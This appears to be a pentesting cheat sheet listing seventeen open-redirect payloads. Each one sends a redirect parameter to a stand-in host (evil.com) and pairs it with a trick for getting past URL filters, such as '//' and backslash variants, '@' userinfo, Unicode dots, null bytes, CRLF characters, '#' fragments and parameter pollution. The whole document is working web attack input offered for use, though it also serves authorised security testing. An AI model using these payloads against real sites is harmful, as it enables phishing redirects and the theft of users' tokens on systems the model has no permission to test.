## Open Redirect

1. Try change the domain
```
/?redir=evil.com
```

2. Using a whitelisted domain or keyword
```
/?redir=target.com.evil.com
```

3. Using `//` to bypass `http` blacklisted keyword
```
/?redir=//evil.com
```

4. Using `https:` to bypass `//` blacklisted keyword
```
/?redir=https:evil.com
```

5. Using `\\` to bypass `//` blacklisted keyword
```
/?redir=\\evil.com
```

6. Using `\/\/` to bypass `//` blacklisted keyword
```
/?redir=\/\/evil.com/
/?redir=/\/evil.com/
```

7. Using `%E3%80%82` to bypass `.` blacklisted character
```
/?redir=evil。com
/?redir=evil%E3%80%82com
```

8. Using null byte `%00` to bypass blacklist filter
```
/?redir=//evil%00.com
```

9. Using parameter pollution
```
/?next=target.com&next=evil.com
```

10. Using `@` or `%40` character, browser will redirect to anything after the `@`
```
/?redir=target.com@evil.com
/?redir=target.com%40evil.com
```

11. Creating folder as their domain
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

12.  Using `?` characted, browser will translate it to `/?`
```
/?redir=target.com?evil.com
```

13. Bypass the filter if it only checks for domain name using `%23`
```
/?redir=target.com%23evil.com
```

14.  Host/Split Unicode Normalization
```
https://evil.c℀.example.com
```

15. Using parsing
```
http://ⓔⓥⓘⓛ.ⓒⓞⓜ
```

16. Using `°` symbol to bypass
```
/?redir=target.com/°evil.com
```

17. Bypass the filter if it only allows yoou to control the path using a nullbyte `%0d` or `%0a`
```
/?redir=/%0d/evil.com
```